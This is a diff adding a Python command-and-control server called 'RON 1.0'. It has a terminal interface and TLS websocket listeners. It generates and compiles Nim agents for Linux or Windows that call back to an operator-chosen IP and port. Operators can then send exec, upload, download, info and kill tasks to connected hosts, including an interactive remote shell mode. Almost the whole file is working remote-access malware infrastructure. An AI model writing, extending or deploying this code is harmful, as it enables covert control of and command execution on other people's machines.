@@ -1,0 +1,445 @@
+#!/usr/bin/python3
+
+import os
+import re
+import ssl
+import json
+import urwid
+import string
+import random
+import socket
+import _thread
+import threading
+import logging
+import asyncio
+import ipaddress
+import websockets
+import subprocess
+from collections import deque
+
+def mkagent(platform, ip, port, id):
+  count = 1
+  file = id + '.nim'
+  original = file
+  while os.path.isfile('resources/agents/' + file):
+    count += 1
+    file = id + str(count) + '.nim'
+  if file != original:
+    original = id
+    id = re.sub('\.nim$', '', file)
+    add_output('Agent renamed: ' + original + ' -> ' + id + '\n', True)
+  with open('resources/agents/agent.nim') as f:
+    code = f.read()
+  code = re.sub('ADDRESS', ip, code)
+  code = re.sub('PORT', port, code)
+  code = re.sub('AGENT', id, code)
+  with open('resources/agents/' + file, 'w') as f:
+    f.write(code)
+  while not os.path.isfile('resources/agents/' + file):
+    pass
+  add_output('Compiling agent...')
+  subprocess.run(['resources/builder/build', platform, id],
+                 stdout=subprocess.DEVNULL,
+                 stderr=subprocess.DEVNULL)
+  add_output('Done')
+  with open('resources/config.json') as f:
+    conf = json.load(f)
+  uri = ip + ':' + port
+  conf["uris"].append(uri)
+  with open('resources/config.json', 'w') as f:
+    json.dump(conf, f)
+  new_thread = threading.Thread(target=start_websocket_server_in_thread, args=(uri,))
+  new_thread.daemon = True
+  new_thread.start()
+
+def get_port():
+  with socket.socket() as s:
+    s.bind(("127.0.0.1", 0))
+    return s.getsockname()[1]
+
+def mkbox(val, bold=False, header=False):
+  vlen = len(val)
+  cols = vlen + 2
+
+  if bold:
+    h = '━'
+    v = '┃'
+    lt = '┣'
+    rt = '┫'
+    ut = '┳'
+    dt = '┻'
+    ct = '╋'
+    c1 = '┏'
+    c2 = '┓'
+    c3 = '┗'
+    c4 = '┛'
+  else:
+    h = '─'
+    v = '│'
+    lt = '├'
+    rt = '┤'
+    ut = '┬'
+    dt = '┴'
+    ct = '┼'
+    c1 = '┌'
+    c2 = '┐'
+    c3 = '└'
+    c4 = '┘'
+
+  sect = h * cols
+ 
+  if header:
+    top = f"{c1}{sect}{c2}"
+    mid = f"\n{v} {val} {v}"
+    bot = f"\n{c3}{sect}{dt}"
+  else:
+    top = f"{c1}{sect}{c2}"
+    mid = f"\n{v} {val} {v}"
+    bot = f"\n{c3}{sect}{c4}"
+
+  return f"{top}{mid}{bot}"
+
+def scroll_lines(listbox, n):
+  walker = listbox.body
+  if not walker:
+    return
+  pos = walker.focus if hasattr(walker, "focus") else 0
+  new_pos = max(0, min(len(walker) - 1, pos + n))
+  walker.set_focus(new_pos)
+
+clients = []
+new_task = {}
+websocket_servers = {}
+shell = 0
+active_count = 0
+
+task_list = [{"code": 0, "name":"kill", "data": ""},
+             {"code": 1, "name":"exec", "data": ""},
+             {"code": 2, "name":"info", "data": ""},
+             {"code": 3, "name":"upld", "data": ""},
+             {"code": 4, "name":"dnld", "data": ""}]
+
+ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+ssl_context.load_cert_chain(certfile="resources/certs/cert.pem", keyfile="resources/certs/key.pem")
+
+def add_task(task_name, task_data):
+  global new_task
+  new_task = [task for task in task_list if task['name'] == task_name][0]
+  new_task["data"] = task_data
+
+def add_client(id, port):
+  client = {"id": id, "port": port, "active": False}
+  return client
+
+class Terminal(urwid.WidgetWrap):
+  def __init__(self):
+    self.screen_text = urwid.Text([''])
+    self.prompt_text = urwid.Edit('─' * cols + '\n>> ', '')
+    self.walker = urwid.SimpleFocusListWalker([self.screen_text])
+    self._w = urwid.Frame(header=urwid.Pile([urwid.Text(mkbox(name, False, True) + '─' * (cols - len(name) - 4))]),
+                          body=urwid.ListBox(self.walker),
+                          footer=self.prompt_text,
+                          focus_part='footer')
+    self.count = 0
+    self.char_limit = 10000
+    self.up_count = 0
+    self.log_history = deque([], 100)
+    self.prompt_history = deque([], 100)
+
+name = 'RON 1.0'
+cols, rows = urwid.raw_display.Screen().get_cols_rows()
+term = Terminal()
+
+def add_output(string, bold=False):
+  if bold:
+    widget = urwid.Text([('bold', string)])
+  else:
+    widget = urwid.Text(string)
+  term.walker.append(widget)
+  MAX_LINES = rows - 6
+  while len(term.walker) > MAX_LINES:
+    term.walker.pop(0)
+  term.walker.set_focus(len(term.walker) - 1)
+  loop.draw_screen()
+
+def process_input(key: str):
+  global shell
+  global active_count
+
+  if key == 'esc':
+    raise urwid.ExitMainLoop()
+  if key == 'page up':
+    scroll_lines(term._w.body, -10)
+  if key == 'page down':
+    scroll_lines(term._w.body, 10)
+  if len(term.prompt_text.edit_text) >= term.char_limit:
+    term.prompt_text.edit_text = term.prompt_text.edit_text[:term.char_limit]
+  if key == 'enter':
+    if term.prompt_text.edit_text == 'clear':
+      term.count = 0;
+      term.up_count = 0;
+      term.screen_text.set_text('')
+      term.prompt_text.edit_text = ''
+      term.walker.clear()
+      loop.draw_screen()
+
+    elif shell == 1:
+      if term.prompt_text.edit_text == 'exit':
+        shell = 0
+        add_output('[C2]', True)
+      else:
+        add_task('exec', term.prompt_text.edit_text)
+        add_output('>> ' + term.prompt_text.edit_text)
+        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+          term.prompt_history.append(term.prompt_text.edit_text)
+      term.prompt_text.edit_text = ''
+      term.up_count = 0;
+
+    else:
+      if term.prompt_text.edit_text == 'exit':
+        raise urwid.ExitMainLoop()
+
+      elif term.prompt_text.edit_text == 'shell':
+        shell = 1
+        add_output('[SHELL]', True)
+        term.prompt_text.edit_text = ''
+
+#      elif term.prompt_text.edit_text.split(' ')[0] == 'upload':
+#        path = os.path.abspath(os.path.join('modules', term.prompt_text.edit_text.split(' ')[1]))
+#        if os.path.isfile(path) and path.startswith(os.path.abspath('modules')):
+#          with open(path) as f:
+#            payload = f.read()
+#        else:
+#          payload = term.prompt_text.edit_text.split(' ', 1)[1]
+#        add_task('luau', payload)
+#        add_output('>> ' + term.prompt_text.edit_text)
+#        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+#          term.prompt_history.append(term.prompt_text.edit_text)
+#        term.prompt_text.edit_text = ''
+
+#      elif term.prompt_text.edit_text.split(' ')[0] == 'download':
+#        if term.prompt_text.edit_text.split(' ')[1] == '-c':
+#          path = os.path.abspath(os.path.join('modules', term.prompt_text.edit_text.split(' ')[2]))
+#          if os.path.isfile(path) and path.startswith(os.path.abspath('modules')):
+#            if term.prompt_text.edit_text.split(' ')[2].endswith('.c'):
+#              with open(path) as f:
+#                body = f.read()
+#              body = c_to_luajit(body)
+#              add_output('>> ' + term.prompt_text.edit_text)
+#              add_output(body)
+#        else:
+#          path = os.path.abspath(os.path.join('modules', term.prompt_text.edit_text.split(' ')[1]))
+#          if os.path.isfile(path) and path.startswith(os.path.abspath('modules')):
+#            with open(path) as f:
+#              body = f.read()
+#            if term.prompt_text.edit_text.split(' ')[1].endswith('.c'):
+#              body = c_to_luajit(body)
+#          else:
+#            body = term.prompt_text.edit_text.split(' ', 1)[1]
+#          if not body.startswith('ffi.cdef'):
+#            with open('modules/cdef') as f:
+#              cdef = f.read()
+#              lines = cdef.count('\n')
+#            if lines > 1:
+#              cdef = re.sub('\n', '; ', cdef)
+#              cdef = re.sub(';;', ';', cdef)
+#          payload = {"cdef": cdef, "body": body}
+#          add_task('lffi', json.dumps(payload))
+#          add_output('>> ' + term.prompt_text.edit_text)
+#        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+#          term.prompt_history.append(term.prompt_text.edit_text)
+#        term.prompt_text.edit_text = ''
+
+      elif [task for task in task_list if task['name'] == term.prompt_text.edit_text.split(' ')[0]]:
+        if ' ' in term.prompt_text.edit_text:
+          add_task(term.prompt_text.edit_text.split(' ')[0], term.prompt_text.edit_text.split(' ', 1)[1])
+        else:
+          add_task(term.prompt_text.edit_text, '')
+        add_output('>> ' + term.prompt_text.edit_text)
+        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+          term.prompt_history.append(term.prompt_text.edit_text)
+        term.prompt_text.edit_text = ''
+
+      elif term.prompt_text.edit_text.startswith('new'):
+        if term.prompt_text.edit_text.split(' ')[1] and term.prompt_text.edit_text.split(' ')[2]:
+          platform = term.prompt_text.edit_text.split(' ')[1]
+          ip = term.prompt_text.edit_text.split(' ')[2]
+          if platform != 'lin' and platform != 'win':
+            add_output('Platform must be specified as "lin" or "win".\n')
+            term.prompt_text.edit_text = ''
+            term.up_count = 0
+            return
+          try:
+            ipaddress.IPv4Address(ip)
+          except ipaddress.AddressValueError:
+            add_output('Invalid IP address.\n')
+            term.prompt_text.edit_text = ''
+            term.up_count = 0
+            return
+          if len(term.prompt_text.edit_text.split(' ')) > 3:
+            if term.prompt_text.edit_text.split(' ')[3]:
+              port = term.prompt_text.edit_text.split(' ')[3]
+              if next((c for c in clients if c["port"] == port), None) is None:
+                s = socket.socket()
+                try:
+                  s.bind(("127.0.0.1", int(port)))
+                except OSError:
+                  add_output('Port unavailable.\n')
+                  term.prompt_text.edit_text = ''
+                  term.up_count = 0
+                  return
+                if len(term.prompt_text.edit_text.split(' ')) > 4:
+                  if term.prompt_text.edit_text.split(' ')[4]:
+                    id = term.prompt_text.edit_text.split(' ')[4]
+                    if next((c for c in clients if c["id"] == id), None) is not None:
+                      add_output('ID already in use.')
+                      term.prompt_text.edit_text = ''
+                      term.up_count = 0
+                      return
+                else:
+                  id = ''.join(random.choices(string.ascii_lowercase, k=5))
+                  while next((c for c in clients if c["id"] == id), None) is not None:
+                    id = ''.join(random.choices(string.ascii_lowercase, k=5))
+            else:
+              add_output('Port already in use.\n')
+              term.prompt_text.edit_text = ''
+              term.up_count = 0
+              return
+          else:
+            id = ''.join(random.choices(string.ascii_lowercase, k=5))
+            while next((c for c in clients if c["id"] == id), None) is not None:
+              id = ''.join(random.choices(string.ascii_lowercase, k=5))
+            port = get_port()
+        else:
+          add_output('Usage: new [PLATFORM] [IP] [PORT] [ID]. IP is required.\n')
+          term.prompt_text.edit_text = ''
+          term.up_count = 0
+          return
+        port = str(port)
+        if len(term.prompt_text.edit_text.split(' ')) == 2:
+          add_output('>> ' + term.prompt_text.edit_text + ' ' + port + ' ' + id)
+        elif len(term.prompt_text.edit_text.split(' ')) == 3:
+          add_output('>> ' + term.prompt_text.edit_text + ' ' + id)
+        else:
+          add_output('>> ' + term.prompt_text.edit_text)
+        if len(term.prompt_history) == 0 or term.prompt_text.edit_text != term.prompt_history[-1]:
+          term.prompt_history.append(term.prompt_text.edit_text)
+        term.prompt_text.edit_text = ''
+        mkagent(platform, ip, port, id)
+
+      elif term.prompt_text.edit_text.startswith('use'):
+        id = term.prompt_text.edit_text.split(' ')[1]
+        client = next((c for c in clients if c["id"] == id), None)
+        client["active"] = True
+        active_count += 1
+        add_output('>> ' + term.prompt_text.edit_text)
+        term.prompt_text.edit_text = ''
+
+      elif term.prompt_text.edit_text.startswith('free'):
+        id = term.prompt_text.edit_text.split(' ')[1]
+        client = next((c for c in clients if c["id"] == id), None)
+        client["active"] = False
+        active_count -= 1
+        add_output('>> ' + term.prompt_text.edit_text)
+        term.prompt_text.edit_text = ''
+
+      else:
+        add_output('Command not found: ' + term.prompt_text.edit_text + '\n')
+        term.prompt_text.edit_text = ''
+
+      term.up_count = 0
+      return
+  elif key == 'backspace':
+    term.prompt_text.edit_text = term.prompt_text.edit_text[:-1]
+  elif key == 'up':
+    if term.up_count < len(term.prompt_history):
+      term.up_count += 1
+      term.prompt_text.edit_text = term.prompt_history[len(term.prompt_history) - term.up_count]
+  elif key == 'down':
+    if term.up_count > 1:
+      term.up_count -= 1
+      term.prompt_text.edit_text = term.prompt_history[len(term.prompt_history) - term.up_count]
+    elif term.up_count == 1:
+      term.up_count -= 1
+      term.prompt_text.edit_text = ''
+
+async def ws(websocket, path):
+  try:
+    receive = True
+    while True:
+      global clients
+      global new_task
+      global shell
+      global active_count
+
+      if receive:
+        try:
+          callback = await websocket.recv()
+          if callback.startswith('Hello from '):
+            id = callback.split(' ')[2]
+            add_output('Callback: ' + id + '\n', True)
+            client = add_client(id, websocket.local_address[1])
+            clients.append(client)
+            receive = False
+        except:
+          pass
+      else:
+        for client in clients:
+          if client["port"] == websocket.local_address[1] and client["active"] and new_task:
+            task = json.dumps(new_task)
+            await websocket.send(task)
+            response = await websocket.recv()
+            if active_count > 1:
+              add_output('[' + client["id"] + ']', True)
+            add_output(response)
+            if shell == 0:
+              add_output('')
+  
+            if response == 'Done':
+              client["active"] = False
+              active_count -= 1
+              clients.remove(client)
+              interactive = False
+              receive = True
+
+            new_task = None
+  except websockets.ConnectionClosed:
+    add_output(f"Connection to {path} closed unexpectedly\n")
+
+async def start_websocket_server(uri):
+  global websocket_servers
+  server = await websockets.serve(ws, uri.split(':')[0], int(uri.split(':')[1]), ssl=ssl_context)
+  await server.wait_closed()
+  add_output(f"WebSocket server started at {uri}\n")
+
+async def stop_websocket_server(uri):
+  global websocket_servers
+  if uri in websocket_servers:
+    websocket_servers[uri].close()
+    await websocket_servers[uri].wait_closed()
+    del websocket_servers[uri]
+    add_output(f"WebSocket server at {uri} stopped\n")
+  else:
+    add_output(f"No WebSocket server found for {uri}\n")
+
+def start_websocket_server_in_thread(uri):
+  loop = asyncio.new_event_loop()
+  asyncio.set_event_loop(loop)
+  loop.run_until_complete(start_websocket_server(uri))
+
+def serve():
+  with open('resources/config.json') as f:
+    uris = json.load(f)["uris"]
+
+  for uri in uris:
+    new_thread = threading.Thread(target=start_websocket_server_in_thread, args=(uri,))
+    new_thread.daemon = True
+    new_thread.start()
+
+new_thread = threading.Thread(target=serve)
+new_thread.daemon = True
+new_thread.start()
+
+palette = [('bold', 'default,bold', '')]
+loop = urwid.MainLoop(term, unhandled_input=process_input, palette=palette)
+loop.run()
